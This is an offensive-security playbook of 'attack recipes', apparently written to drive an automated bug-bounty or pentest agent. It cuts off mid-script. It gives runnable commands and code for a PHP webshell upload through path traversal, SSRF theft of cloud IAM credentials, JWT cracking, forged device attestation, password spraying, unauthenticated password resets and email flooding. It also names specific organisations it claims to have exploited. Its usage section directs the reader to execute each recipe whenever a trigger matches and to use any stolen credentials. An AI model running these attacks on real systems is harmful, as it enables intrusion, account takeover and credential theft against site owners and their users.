# Attack Recipes — Proven Patterns

Scan these triggers during Phase 2/3 entry. If trigger matches → MUST test the recipe.

---

## RECIPE: Forgot Password User Enumeration Oracle

**TRIGGER:** Forgot password endpoint returns "same" success for all emails
**TECHNIQUE:**
1. Register your own account, trigger forgot for it
2. Trigger forgot for a clearly fake email
3. Compare: raw bytes, content-length, timing, headers, whitespace
4. Diffs: single vs double space, 2.7s vs 1.1s, extra Set-Cookie, JSON field order

**mock.hackme (June 2026):** "reset your" (exists) vs "reset  your" (fake) — double space oracle.

**EXPECTED YIELD:** User enumeration (Low), enables targeted ATO chains

---

## RECIPE: Same-Endpoint Multi-Action Parameter Collision

**TRIGGER:** Single URL handles multiple actions based on which POST params are present (e.g., /login handles login, forgot, AND change password)
**TECHNIQUE:**
1. Map which param combos trigger which action (login=username+password, forgot=forgot_email, reset=hash+change_password)
2. Send COMBINED params in single request: `forgot_email=victim@x.com&hash=&change_password=New123&change_con_password=New123`
3. Test if forgot triggers FIRST (setting server state), then change executes in same request
4. Test if sending login + forgot together leaks different error for existing vs non-existing users
5. Test race: trigger forgot in request A, immediately send change in request B with same session

**mock.hackme (June 2026):** All three actions routed through POST /login, differentiated by params. Combo didn't bypass but revealed the shared endpoint architecture.

**EXPECTED YIELD:** Logic bypass (High), auth bypass, state confusion

---

## RECIPE: Prerequisite Skip
**TRIGGER:** Multi-step flow (KYC, loan, consent, onboarding, payment)
**TECHNIQUE:**
1. Map all sequential steps from Burp history
2. Call step N directly WITHOUT calling step N-1
3. Call steps OUT OF ORDER
4. Submit final approval without viewing prerequisite docs
**EXPECTED YIELD:** Business logic bypass (High — regulatory if compliance flow)
**PROVEN ON:** Jago Riplay — consent-stage accepted without compliance-check (OJK violation)

---

## RECIPE: OTP Oracle
**TRIGGER:** Any endpoint validating a code (/verify, /validate, /confirm, /bind, /otp)
**TECHNIQUE:**
1. Submit correct code → note response (status, body, error code)
2. Submit wrong code → note response
3. Compare: different error code/status = oracle = brute-forceable
4. Check sibling endpoints (e.g. /bind/ vs /verify/) — one may lack rate limiting
5. Test unauthenticated context — oracle without session = worse
**EXPECTED YIELD:** Account takeover via brute-force (High/Critical)
**PROVEN ON:** Multiple mobile APIs — differential response enables 4-6 digit brute-force

---

## RECIPE: Attestation Forge → Full Auth
**TRIGGER:** Eversafe, SafetyNet, Play Integrity in mobile app
**TECHNIQUE:**
1. Extract attestation format (TLV, JWT, binary)
2. Forge attestation token (Eversafe: TLV tag 0x02 bypass)
3. Enroll device via API with forged attestation
4. Register own RSA/EC key during enrollment
5. Sign all future auth requests with your key
**EXPECTED YIELD:** Full authentication bypass (Critical)
**PROVEN ON:** Jago — Eversafe TLV forge → device enroll → RSA key → independent auth

---

## RECIPE: API Version Downgrade
**TRIGGER:** Versioned API paths (/v1/, /v2/, /api/v3/)
**TECHNIQUE:**
1. Fuzz: /v0/, /v1/, /v2/, /beta/, /internal/, /legacy/
2. For each responding version, test same endpoint with/without auth
3. Compare auth enforcement (older versions often skip middleware)
4. Check if deprecated endpoints still route and lack validation
**EXPECTED YIELD:** Auth bypass (High), missing input validation (Medium)
**PROVEN ON:** Common in microservice architectures with gateway routing

---

## RECIPE: CORS + Sensitive Endpoint Chain
**TRIGGER:** Permissive CORS (Origin reflected + Allow-Credentials: true) AND sensitive data endpoints
**TECHNIQUE:**
1. Test CORS: `curl -H "Origin: https://evil.com" -I $URL`
2. If origin reflected + credentials allowed → find endpoints returning sensitive data
3. Chain: attacker page reads victim's authenticated data cross-origin
4. Escalate: if write endpoints also CORS-permissive → full CSRF bypass
**EXPECTED YIELD:** Data theft / account takeover (High/Critical with credentials)
**PROVEN ON:** GoPay — CORS + debug endpoint = credential chain

---

## RECIPE: Mass Assignment via Extra Fields
**TRIGGER:** Any POST/PUT/PATCH that creates or updates user/account data
**TECHNIQUE:**
1. Send normal request, note accepted fields
2. Add: `"role":"admin"`, `"is_verified":true`, `"balance":99999`, `"permissions":["*"]`
3. Check response — which fields were silently accepted?
4. Verify state change (re-fetch object, check if role/balance changed)
**EXPECTED YIELD:** Privilege escalation (High), data manipulation (Medium)
**PROVEN ON:** Common on Node/Express (no schema validation) and Rails (permit bypass)

---

## RECIPE: SSRF → Cloud Metadata → Secrets
**TRIGGER:** URL-accepting parameters (webhook, import, fetch, avatar, callback)
**TECHNIQUE:**
1. Test: `http://169.254.169.254/latest/meta-data/` (AWS)
2. IMDSv2: PUT to get token, then GET with token header
3. GCP: `http://metadata.google.internal/computeMetadata/v1/` + header
4. Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + header
5. Extract: IAM credentials, service account tokens, env vars
6. USE extracted creds to access internal services (don't just report SSRF)
**EXPECTED YIELD:** Critical (full cloud account access via leaked IAM creds)
**PROVEN ON:** Standard cloud exploitation chain

### SSRF Sub-Recipe: Lambda file:// Protocol → IAM Creds
**TRIGGER:** SSRF on AWS Lambda where IMDS (169.254.169.254) is blocked/connection refused
**TECHNIQUE:**
1. If `http://169.254.169.254/` returns "Connection refused" → Lambda has IMDSv2 or IMDS disabled
2. Test `file:///proc/self/environ` — Lambda env vars contain IAM creds as null-separated entries
3. Parse output for: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
4. Also extract: `AWS_LAMBDA_FUNCTION_NAME`, `_HANDLER` (reveals source path)
5. Read Lambda source: `file:///var/task/lambda_function.py` (or handler path from `_HANDLER`)
6. Use stolen creds: `aws sts get-caller-identity` → reveals role ARN → enumerate IAM permissions
```python
import requests
r = requests.post("https://target/endpoint",
    headers={"authorizationToken": "<token>", "Content-Type": "application/json"},
    json={"fileName": "file:///proc/self/environ"})
# Parse null-separated env vars from response
env_vars = r.json()["body"].split("\\x00")
```
**KEY INSIGHT:** Python `requests.get("file:///path")` works natively — no special adapter needed. Many SSRF filters block `http://169.254.x.x` but forget `file://` protocol entirely.
**POST-EXPLOITATION:** After getting IAM creds: `sts get-caller-identity` → role name → `iam list-role-policies` → enumerate what the Lambda can access (S3, DynamoDB, other Lambdas).
**PROVEN ON:** EvidentCrime (SecOps exam, June 2026) — `/myfiles` endpoint passed `fileName` directly to `requests.get()`. IMDS blocked but `file:///proc/self/environ` leaked full IAM session creds + flag.

---

## RECIPE: JWT Weak Secret / Algorithm Confusion
**TRIGGER:** JWT-based auth (decode header: check alg field)
**TECHNIQUE:**
1. Try `alg:none` — remove signature entirely
2. RS256→HS256 confusion: use public key as HMAC secret
3. Weak secret: `hashcat -m 16500 jwt.txt rockyou.txt`
4. `kid` injection: `"kid":"../../dev/null"` or SQLi in kid
5. Expired token reuse: send expired JWT, check if still accepted
**EXPECTED YIELD:** Auth bypass (Critical)
**PROVEN ON:** Multiple targets — always test even if "it should be secure"

---

## RECIPE: Internal Log System Injection (NELO/ELK/Sentry Self-Hosted)
**TRIGGER:** JS bundles reference internal logging endpoints (nelo.navercorp.com, internal ELK, self-hosted Sentry, internal Datadog)
**TECHNIQUE:**
1. Extract logging URLs from JS bundles (grep for `_store`, `ingest`, `_bulk`, `logLevel`)
2. Extract project names/IDs from same JS context (often hardcoded near URL)
3. Test unauthenticated POST with minimal log entry structure:
   - **NELO:** `POST /_store` with `[{"projectName":"<extracted>","logVersion":"2","body":"test","logLevel":"ERROR","logSource":"injected","logType":"nelo2-http"}]`
   - **ELK:** `POST /_bulk` or `POST /<index>/_doc`
   - **Sentry:** `POST /api/<project>/store/` with envelope format
4. If accepted (200/202) → prove impact:
   - **Stored XSS:** inject `<script>` in body field (renders in internal dashboards)
   - **Log poisoning:** inject fake security alerts to cause incident response fatigue
   - **Mass injection:** batch 100+ logs per request to pollute monitoring
5. Verify no rate limiting by sending 5+ batch requests
**EXPECTED YIELD:** Medium-High (write access to internal monitoring infrastructure)
**PROVEN ON:** LINE WORKS (June 2026) — `jp-col-ext.nelo.navercorp.com/_store` accepted unauthenticated writes with project `P6349d1_cstalk_connect`. Stored XSS + fake incident injection + batch flooding all confirmed.
**KEY INSIGHT:** Internal logging services often trust requests from "inside the network" but are exposed to internet via CDN/proxy misconfiguration. The project name is the only "auth" — extractable from client-side JS.

---

## RECIPE: CDN/Alternate-Origin WAF Bypass
**TRIGGER:** Target uses CDN (pstatic, Akamai, CloudFront) that mirrors origin content; OR multiple domains resolve to same backend (e.g., line-works.com + line-works.pstatic.net)
**TECHNIQUE:**
1. Identify CDN/mirror domains from page source (look for static asset URLs on different hostname)
2. Try the SAME paths on CDN domain that are blocked (403) on main domain:
   - If main blocks `/wp-json/wp/v2/users` → try on CDN domain
   - If main blocks `/xmlrpc.php` → try on CDN domain
3. CDN may not replicate nginx location blocks → different security posture
4. Test PHP execution on CDN (try wp-config-sample.php — if 500 = PHP runs)
5. Check if CDN domain shares cookies with main (same parent domain?)
**EXPECTED YIELD:** Security control bypass (Medium-High depending on what becomes accessible)
**PROVEN ON:** LINE WORKS (June 2026) — `line-works.pstatic.net` served same WP content but nginx rules partially different. `/wp-json/wp/v2/users` returned 401 (not 403) without needing case bypass. `wp-config-sample.php` triggered PHP 500 error.
**KEY INSIGHT:** CDN configs are often set-and-forget. Security rules added to origin nginx post-deployment may never propagate to CDN layer.

---

## RECIPE: Host Header Injection → Redirect Poisoning
**TRIGGER:** nginx/reverse proxy fronting application; especially WordPress or language-based routing (locale redirects like /jp/en/)
**TECHNIQUE:**
1. `curl -H "Host: evil.com" https://target.com/` — check Location header
2. If 302 to `https://evil.com/<path>` → exploitable via:
   - Cache poisoning (if CDN caches the redirect)
   - DNS rebinding (resolve target IP, send Host: evil.com)
   - Password reset poisoning (if reset emails use Host header for link generation)
3. Test on subpaths: root may redirect but /download/ may not
4. Test X-Forwarded-Host separately (different behavior possible)
5. Check if response is cached (look for Age, X-Cache headers)
**EXPECTED YIELD:** Low-Medium standalone (phishing amplification), High if cached or used in password reset
**PROVEN ON:** LINE WORKS (June 2026) — `GET / + Host: evil.com` → `302 Location: https://evil.com/jp/en/`. Only root path affected, not subpaths. Not cached (limited impact).

---

## RECIPE: CDN Path Traversal → Internal Origin Disclosure
**TRIGGER:** Target uses Varnish/Fastly CDN in front of API (`x-served-by: cache-*`, `via: 1.1 varnish`)
**TECHNIQUE:**
1. Send `%2e%2e` in URL paths: `GET /v1/auth/%2e%2e/anything`
2. Check for 302 with `Location:` pointing to internal hostname
3. If found: enumerate discovered domain (dig, curl, CT logs)
4. Check for admin panels, staging, alternate TLDs
**EXPECTED YIELD:** Internal hostnames, admin panel discovery, staging environments, IAP OAuth client IDs. WinTicket (2026): exposed `api-origin.winticket.bet`, `admin.winticket.bet` (GCP IAP), `stg.winticket.bet`.

---

## RECIPE: Intent Fragment Injection via OAuth Callback
**TRIGGER:** Mobile OAuth endpoint returns `intent://` in Location header with reflected POST body
**TECHNIQUE:**
1. Send form-encoded POST with raw `#` in value: `code=x#Intent;package=com.fake;S.browser_fallback_url=https://evil.com;end//`
2. If raw `#` passes through unsanitized → attacker controls first `#Intent;` block
3. Android uses first fragment → attacker's package/fallback URL takes precedence
**EXPECTED YIELD:** Open redirect via browser_fallback_url (High), phishing on Android, intent hijack. Escalates basic Login CSRF to full redirect control.

---

## Laravel/Inertia/Vue Recipes

### RECIPE: Laravel Parameterized Config Leak → Mass ATO
**TRIGGER:** Laravel app with `/api/get-params/{type}` or similar parameterized config endpoint
**TECHNIQUE:**
1. Enumerate param types: passDefault, PASSWORD, SLA, VERIFIKASI, CATEGORY, STATUS
2. If passDefault returns a password value → find user list endpoint (`/api/load-user`)
3. Determine login identifier format (email vs username) from load-user response
4. Spray default password against all active user emails
5. Post-auth: check Inertia `data-page` for SIP creds, tokens, internal config
**EXPECTED YIELD:** Mass ATO (Critical). BlueSpider June 2026: 69/90 prod accounts including Super Admin.
**KEY LESSON:** username enumeration ≠ login credentials. Always find the EMAIL endpoint separately.
**CROSS-REF:** `references/laravel-default-password-ato.md`

### RECIPE: Ziggy Route Dump Extraction
**TRIGGER:** Target returns HTML with `const Ziggy = {...}` or `data-page="{...ziggy...}"` in page source (Laravel + Inertia.js apps).
**TECHNIQUE:**
1. View page source of login/register page
2. Parse the Ziggy JSON — contains ALL named routes with URIs and HTTP methods
3. Check for `_ignition` routes (debug mode), `sanctum` (API auth), `register` (open registration)
**EXPECTED YIELD:** Complete authenticated route map without fuzzing. Reveals Ignition debug, Sanctum endpoints, admin panels.
**EXAMPLE (BlueSpider June 2026):** vkyc.aosgraha.com page source exposed 22 routes including `_ignition/execute-solution` (RCE-capable).

### RECIPE: Laravel JS Bundle API Extraction
**TRIGGER:** Laravel/Vue/Inertia app with Vite build (`/build/assets/app-*.js`).
**TECHNIQUE:**
```bash
curl -sk "https://target/build/assets/app-*.js" | grep -oE '"/api/[a-zA-Z0-9_/-]{2,80}"' | sort -u
```
Then batch-test each endpoint for unauth access (200 without session).
**EXPECTED YIELD:** 50-100+ API endpoints. Common unauth leaks: user lists, templates, params, config.
**PITFALL:** Don't use ffuf on rate-limited Laravel targets. If target starts timing out after probing, use manual curl loops with 4s timeout per request instead of bulk fuzzing.
**EXAMPLE (BlueSpider June 2026):** 83 endpoints extracted, 9 accessible without auth including 166 usernames on prod.

### RECIPE: CORS Wildcard + Unauth API Chain
**TRIGGER:** API returns `Access-Control-Allow-Origin: *` AND has unauth-accessible endpoints with sensitive data.
**TECHNIQUE:**
1. Confirm CORS: `curl -H "Origin: https://evil.com" -D - URL | grep access-control`
2. Identify unauth endpoints returning PII/user data
3. Chain: attacker website → fetch() → steal data cross-origin
**EXPECTED YIELD:** Medium-High (cross-origin data theft enables credential stuffing, social engineering).
**EXAMPLE:** /api/user-combo-username (130 users) + ACAO:* = any website steals agent roster.

### RECIPE: Ignition Debug Mode Check
**TRIGGER:** Laravel app (identified by XSRF-TOKEN/laravel_session cookies).
**TECHNIQUE:**
1. `GET /_ignition/health-check` — if returns `{"can_execute_commands":true}` → debug mode ON
2. `POST /_ignition/execute-solution` — test with dummy payload, check for 403 (IP-restricted) vs 500 (exploitable)
3. If 403: try X-Forwarded-For/X-Real-IP bypass headers
4. If accessible: use CVE-2021-3129 Ignition RCE chain
**EXPECTED YIELD:** RCE if execute-solution is reachable. Info disclosure (stack traces, paths) even without RCE.

---

## RECIPE: Spring Boot OpenAPI/Swagger Auth Bypass
**TRIGGER:** Target is Spring Boot (Istio/Envoy or nginx proxy), API endpoints under `/prefix/api/*` all return 401.
**TECHNIQUE:**
1. Test OpenAPI v3 at `/prefix/v3/api-docs` (NOT `/prefix/api/v3/api-docs`)
2. Test Swagger UI at `/prefix/swagger-ui/index.html` and `/prefix/webjars/swagger-ui/`
3. Test `/prefix/health` (often whitelisted for K8s liveness probes)
4. Check `swagger-initializer.js` for `configUrl` → follow to swagger-config
5. Check swagger-config response for internal hostnames in `oauth2RedirectUrl`
**EXPECTED YIELD:** Full API spec (95+ endpoints, 130+ schemas), interactive Swagger UI, internal hostname disclosure, DB type via /health.
**WHY IT WORKS:** Spring Security filter covers `/api/**` but springdoc registers at context root. Istio routes by prefix match — `/prefix/v3/` bypasses `/prefix/api/` auth rule.
**PROVEN ON:** AltoCMS (June 2026) — `/jago/v3/api-docs` exposed 97KB OpenAPI spec, Swagger UI fully functional, `/jago/health` leaked PostgreSQL + disk info, swagger-config leaked `dashboard-jago.cms.local.alto.id`.

---

## RECIPE: Systematic Unauth Endpoint Testing from OpenAPI Spec
**TRIGGER:** OpenAPI spec obtained (authenticated or not), all endpoints assumed auth-gated.
**TECHNIQUE:**
1. Parse all paths with correct HTTP methods from spec
2. Test EVERY endpoint with correct method + empty `{}` body
3. Focus on utility endpoints: `/download/*`, `/cache/*`, `/remove-*`, `/cleanup/*`, `/export/*`
4. Fire-and-forget endpoints (return "Success" regardless of input) may still perform destructive actions
5. Test with path traversal payloads on any file-accepting params
**EXPECTED YIELD:** Unauthenticated access to utility/maintenance endpoints missed by SecurityConfig.
**PROVEN ON:** AltoCMS (June 2026) — `/api/download/remove-files` was completely unauthenticated despite 94/95 other endpoints properly gated. Accepted file deletion requests without auth.
**KEY INSIGHT:** Developers forget `@PreAuthorize` on utility endpoints because they're "internal only" — but if the route is registered, it's accessible.

---

## RECIPE: Email Flooding via Forgot-Password (No Rate Limit)
**TRIGGER:** Forgot-password returns same response (OK-000) for all inputs, no rate limit on login confirmed.
**TECHNIQUE:**
1. Send 20+ forgot-password requests for SAME email in rapid succession
2. If all return OK (200) = each triggers a password reset email
3. Quantify: measure requests/second sustainable
4. Note: each new reset invalidates previous tokens (DoS on legitimate reset)
**EXPECTED YIELD:** Medium — inbox flooding DoS + denial of password reset service + potential token prediction if tokens are sequential.
**PROVEN ON:** AltoCMS (June 2026) — 20/20 requests succeeded in 4 seconds (5 req/s), zero rate limiting. Confirmed via PoC script.

---

## RECIPE: XHR JSON Bypass on Session-Gated Java Apps
**TRIGGER:** Java/JBoss/WildFly app with 302 auth redirects on unauthenticated requests. JSP/2.3 in X-Powered-By. JSESSIONID session cookies.
**TECHNIQUE:**
1. Send POST with `Content-Type: application/json` + `X-Requested-With: XMLHttpRequest`
2. Compare: GET returns 302 (auth redirect) vs POST+JSON+XHR returns 400/403/500 JSON
3. If bypass confirmed → scan ALL auth-gated endpoints with this technique
4. Look for: endpoints returning 400 with validation errors (process requests without auth)
5. Check verbose error JSON for `exceptionType`, internal class names, URIs
```python
hdrs = {'X-Requested-With':'XMLHttpRequest','Content-Type':'application/json'}
r = requests.post(f'{base}/protected/path', json={}, headers=hdrs, verify=False, allow_redirects=False)
# If status != 302 → BYPASS
```
**EXPECTED YIELD:** Access control bypass on internal APIs, verbose error disclosure (Java exception classes), unauthenticated access to auth/entitlements endpoints. Medium severity unless credential validation or data access proven.
**PROVEN ON:** BIFast (June 2026) — ACI UP platform. 8 OAuth/Entitlements endpoints reached via bypass. AuthenticationFactorVerify processed auth requests without session. Java IOException leaked.
**KEY INSIGHT:** The XmlHttpRequest handler in ACI UP/Java frameworks often has a separate code path that returns JSON errors instead of redirecting. This path may skip session validation entirely.

---

## RECIPE: H2C Upgrade Over TLS
**TRIGGER:** HTTPS server speaking HTTP/2 (check with `curl --http2`).
**TECHNIQUE:**
```bash
curl -sk -H 'Upgrade: h2c' -H 'Connection: Upgrade' -H 'HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA' -o /dev/null -w '%{http_code}' 'https://target/'
```
If 101 Switching Protocols → server accepts H2C cleartext upgrade over TLS (should be rejected).
**EXPECTED YIELD:** Low standalone. High if reverse proxy in front (H2C smuggling bypasses access controls).
**PROVEN ON:** BIFast (June 2026) — host 55 returned 101, host 50 did not.

---

## Usage Protocol

When entering Phase 2/3 on ANY engagement:
1. List all triggers observed during recon
2. For each matching trigger → execute the recipe
3. If recipe yields a finding → check if it chains with another recipe
4. Document recipe name in finding for future pattern tracking

---

## RECIPE: Unauth Password Reset → ATO (BlueSpider, June 2026)

**TRIGGER:** Laravel app with `/api/reset-default-password` in JS bundle or route dump. Any `passDefault` param endpoint.

**TECHNIQUE:**
1. `GET /api/load-user` → extract user IDs + emails (no auth)
2. `POST /api/reset-default-password {"user_id": <id>}` → resets to system default (no auth)
3. `GET /sanctum/csrf-cookie` → get fresh XSRF + session cookie
4. `POST /login` with JSON body + `X-XSRF-TOKEN` header + `Accept: application/json` → HTTP 204 = success
5. `GET /dashboard` → parse `data-page` attribute for `props.auth.user` (proves identity)
6. `GET /customer-profile/{id}` → parse `data-page` for `props.cust` (proves PII access)

**YIELD:** Critical ATO. If passDefault API param is null but endpoint returns "Success", server uses hardcoded fallback (test: JAGO1234!, 12345678, Bscrm123!).

**KEY LESSON:** HTTP 204 on login ≠ ATO proof. Must prove: (a) identity via dashboard data-page, (b) victim data access. Without steps 5-6 the finding is "unauth password reset" (High), not "ATO with data access" (Critical).

**INACTIVE USERS:** Login returns 422 for INACTIVE users even with correct password. Always target ACTIVE users from load-user response.

---

## RECIPE: Third-Party SDK Token Injection
**TRIGGER:** JS bundles or APK containing SDK client tokens (Adjust, Sentry, Datadog, Braze, Segment, SGTM, Amplitude, Mixpanel)
**TECHNIQUE:**
1. Extract tokens from JS source (`datadogRum.init({clientToken:`, `Sentry.init({dsn:`, `window._adjust`, Braze `apiKey`)
2. For each token, test write access:
   - **Adjust:** `POST https://app.adjust.com/event` with `app_token=<TOKEN>&event_token=<any6char>` — 200 = injectable
   - **Adjust revenue:** add `revenue=9999&currency=JPY` — 200 = fake revenue accepted
   - **Sentry:** `POST https://<key>@<org>.ingest.sentry.io/api/<project>/store/` with minimal envelope — 200 + event_id = injectable
   - **Datadog RUM:** `POST https://rum.browser-intake-<region>.datadoghq.com/api/v2/rum?dd-api-key=<clientToken>` — 202 = injectable
   - **Datadog Logs:** same pattern with `/api/v2/logs` — 202 = injectable
   - **Braze:** `POST https://<endpoint>/content_cards/sync` with `api_key=<SDK_KEY>` — 201 = readable
   - **SGTM:** `POST https://<container>.tagging-server.com/` with fake GA4 events — 200 = injectable
3. Prove business impact: attribution fraud (Adjust), log poisoning (Sentry/DD), analytics manipulation (SGTM)
**EXPECTED YIELD:** Low-Medium individually, but chains well with social engineering or attribution fraud
**PROVEN ON:** WinTicket (June 2026) — Adjust app_token from APK, Sentry DSN from JS, Datadog clientToken from JS, Braze SDK key from JS, all confirmed write-access. Adjust revenue injection = direct financial impact on marketing attribution.
**NOTE:** These are write-only client tokens by design. Severity depends on platform: attribution fraud (Adjust) > log pollution (Sentry) > analytics skew (DD). Report as "information disclosure enabling abuse" not "API key leak."

---

## RECIPE: TWA/PWA Wrapper APK Key Extraction
**TRIGGER:** Target has Android app but is actually a Trusted Web Activity (TWA) or WebView wrapper (APK < 5MB, Chrome/WebView dependency)
**TECHNIQUE:**
1. Download APK via `apkeep -a <package> -d apk-pure .`
2. Decompile: `jadx -d output/ app.apk`
3. Even tiny TWAs contain: `google-services.json` (or equivalent in resources), `AndroidManifest.xml` with SDK configs
4. Extract: Firebase API key (often UNRESTRICTED — no referer check unlike web key), Adjust app_token, OAuth client_id, app bundle IDs
5. Test Firebase key WITHOUT Referer header — mobile keys typically have no HTTP restriction
6. Compare mobile key vs web key restrictions — mobile often more permissive
**EXPECTED YIELD:** Unrestricted API keys enabling all Firebase attacks without referer spoofing (Medium)
**PROVEN ON:** WinTicket (June 2026) — 504KB TWA APK contained unrestricted Firebase key (web key required Referer), Adjust production token, Google OAuth client_id. Mobile key worked from any origin without headers.
**KEY INSIGHT:** Even if the APK is "just a Chrome wrapper," the build tooling embeds SDK credentials. Always decompile regardless of APK size.

---

## RECIPE: Unauthenticated Email Flooding (Trusted Domain Abuse)
**TRIGGER:** Target has email-based auth (magic links, OTP, verification emails) with a send endpoint
**TECHNIQUE:**
1. Identify the email-send endpoint (e.g., `/v1/auth/email`, `/api/send-link`, `/auth/magic-link`)
2. Check if it requires authentication (many need only a pre-auth token or nothing at all)
3. Send 10+ requests to the SAME external email address — check for rate limiting
4. If no rate limit: send to multiple external addresses to confirm it's not per-recipient
5. Verify delivery: emails arrive from trusted domain (e.g., `info@mail.target.com`) with valid SPF/DKIM
6. Document: sender address, headers (SPF pass, DKIM valid), volume achievable, content controllability
**EXPECTED YIELD:** Medium (email flooding/spam via trusted domain, phishing amplification)
**PROVEN ON:** WinTicket (June 2026) — `POST /v1/auth/email` sent unlimited emails from `info@mail.winticket.jp` to ANY external address. 20 emails delivered with zero rate limiting. Required only a pre-token (obtainable without auth from `/v1/auth/email/token`).
**KEY INSIGHT:** Even if the email content is fixed (login link), the impact is: (1) mailbox flooding DoS, (2) domain reputation abuse, (3) phishing amplification (victim sees legit sender domain in inbox → trusts future spoofed emails). Strongest when sender domain has valid SPF+DKIM — makes future phishing more credible.
**SEVERITY FACTORS:**
- No auth needed to trigger sends → Higher
- Unlimited volume (no rate limit) → Higher
- Can target ANY external address → Higher
- Email content contains controllable fields (name, URL) → Higher (phishing)
- Fixed content, auth required, per-recipient limit → likely OOS per most programs

---

## RECIPE: Payment Gateway Merchant Validation Oracle
**TRIGGER:** Payment integration (GMO, Stripe, PayPal, Adyen) with merchant/shop IDs visible in JS or API responses
**TECHNIQUE:**
1. Extract ShopID/MerchantID from JS bundles, checkout flow, or API responses
2. Hit payment gateway API with extracted ID + wrong credential:
   - **GMO:** `POST https://p01.mul-pay.jp/payment/ExecTran.idPass` with `ShopID=<extracted>&ShopPass=wrong`
   - Error `E01030002` (wrong ShopPass) confirms ShopID is VALID (vs `E01030001` = wrong ShopID)
3. Valid ShopID enables: brute-force ShopPass, phishing with legitimate merchant context, transaction enumeration
4. If ShopPass is also extractable → test actual transaction creation
**EXPECTED YIELD:** Low-Medium (merchant ID confirmation enables targeted attacks)
**PROVEN ON:** WinTicket (June 2026) — GMO ShopID `tshop00066026` confirmed valid via differential error response. ShopPass not extractable (strong).

---

## RECIPE: SSH Key Reconstruction from Corrupted/Leaked Sources

**TRIGGER:** SSH private key found on pastebin, git history, or OSINT source but won't load (`invalid format`)
**TECHNIQUE:**
1. Download raw key content
2. Common corruption issues:
   - CRLF line endings (`\r\n` instead of `\n`) — fix with `sed 's/\r$//'`
   - Improper base64 line wrapping (OpenSSH requires max 70-char lines)
   - Character substitution in challenge keys (Cyrillic lookalikes, `|` vs `l`, `0` vs `O`)
   - Missing/extra newline after header/before footer
3. Identify key type from header bytes: decode base64, first field = key type string
4. Reconstruct with proper formatting:
```bash
printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' \
'<base64 line 1 max 70 chars>' \
'<base64 line 2>' \
'-----END OPENSSH PRIVATE KEY-----' > fixed_key
chmod 600 fixed_key
ssh-keygen -y -f fixed_key  # Validates + shows public key
```
5. Key comment reveals target hint (e.g., `id_rsa_backup_docker` → try Docker SSH ports 2222/2200)
6. Try ALL live hosts on standard AND non-standard SSH ports (22, 2222, 2200, 8022, 22222)
**EXPECTED YIELD:** Authenticated access to target host
**PROVEN ON:** SecOps exam (June 2026) — pastebin ed25519 key with bad line wrapping. Comment `id_rsa_backup_docker` hinted at port 2222. Key worked on Docker container SSH (`172.20.213.9:2222`).
**KEY INSIGHT:** Always check the key comment (`ssh-keygen -y -f key`) — it often reveals the target service (docker, backup, staging, etc.) and guides port selection.

---

## Mobile-Specific Recipes (load for mtest Phase 5+)

### RECIPE: Deeplink Hijacking
**TRIGGER:** App registers custom URL scheme or app links
**TECHNIQUE:**
1. Check AndroidManifest for intent-filters with custom schemes
2. Create competing app claiming same scheme (no verification on custom schemes)
3. Test: does the victim app pass sensitive data (tokens, codes) via deeplink?
4. App Links (https): check if assetlinks.json is properly configured
**EXPECTED YIELD:** Token theft / auth bypass (High)

### RECIPE: Exported Component Abuse
**TRIGGER:** Exported activities/services/receivers in manifest without permission guards
**TECHNIQUE:**
1. List exported components: `adb shell dumpsys package <pkg> | grep -A1 "exported=true"`
2. Launch activities directly: `adb shell am start -n pkg/.InternalActivity`
3. Send broadcasts: `adb shell am broadcast -a custom.ACTION --es key value`
4. Bind to services and call methods
**EXPECTED YIELD:** Auth bypass, data access, privilege escalation (Medium-High)

### RECIPE: Certificate Pinning Bypass as Enabler
**TRIGGER:** App uses cert pinning (connection fails with proxy)
**TECHNIQUE:**
1. Frida script to bypass: `frida -U -l ssl-bypass.js <pkg>`
2. Once bypassed → full API traffic visible → enables all other recipes
3. Check if bypass reveals additional endpoints not in public docs
**EXPECTED YIELD:** Enables further testing (prerequisite, not a finding itself)

---

## Web3-Specific Recipes (load for w3hunt)

## Web3-Specific Recipes (load for w3hunt)

### RECIPE: Role Persistence After Transfer
**TRIGGER:** NFT/token with role-based access (DAO governance, ENS, admin NFTs)
**TECHNIQUE:**
1. Identify roles assigned to token holders (admin, operator, manager)
2. Transfer token to new address
3. Check: does OLD address still have the role?
4. Check: does NEW address automatically get the role?
5. If old keeps role → role persistence vulnerability
**EXPECTED YIELD:** Unauthorized access persistence (High — $25K+ on Immunefi)
**PROVEN ON:** ENS contracts-v2 — role not revoked after NFT transfer

### RECIPE: Access Control on Internal Functions
**TRIGGER:** Contracts with role-based modifiers (onlyOwner, onlyOperator)
**TECHNIQUE:**
1. Map all public/external functions
2. Identify which lack access control modifiers
3. Check if unprotected functions can modify critical state
4. Test: can non-privileged address call admin functions?
**EXPECTED YIELD:** Privilege escalation (Critical if funds at risk)

---

## RECIPE: Avatar Upload Path Traversal to RCE

**TRIGGER:** File upload stores files in a directory where PHP/script execution is disabled, but parent directory has execution enabled.
**TECHNIQUE:**
1. Confirm upload accepts `.php` extension (prepend PNG magic bytes: `\x89PNG\r\n\x1a\n<?php ...?>`)
2. Check if uploaded files execute — if served as plain text, PHP is disabled in that dir
3. Test path traversal in filename: `../shell.php`
4. Access the file in the parent directory where PHP IS enabled
```bash
printf '\x89PNG\r\n\x1a\n<?php echo file_get_contents("/etc/flag"); ?>' | \
curl -sk -b "PHPSESSID=<sess>" -X POST "https://target/upload" \
  -F "file=@-;filename=../shell.php;type=image/png" -F "submit=Upload"
```
5. Check renamed filename on profile page (apps often append random suffix)
6. Access in parent dir: `https://target/upload-parent/shellXXXXX.php`

**Key notes:**
- App may rename: `../shell.php` → `../shellRaNdOm.php` (random suffix)
- PNG magic bytes bypass "valid file format" checks
- `.htaccess`/`.user.ini` uploads may be blocked by name, but `.php` with traversal is not
- SecOps June 2026: `public/image/avatar/` had PHP disabled, `public/image/` had it enabled

**EXPECTED YIELD:** RCE via webshell, arbitrary file read (Critical)

---

## RECIPE: Base64-Encoded XML Submission (XXE in SPAs)

**TRIGGER:** SPA/AJAX feature that sends XML as base64-encoded POST parameter. Common in contact forms, country selectors, config loaders. Look for `btoa('<?xml` in JS source.
**TECHNIQUE:**
1. Inspect JS for `btoa('<?xml` pattern or base64 POST params
2. Get CSRF token (same session required for token validity)
3. Craft XXE and base64-encode:
```python
import requests, base64, re
s = requests.Session()
s.verify = False
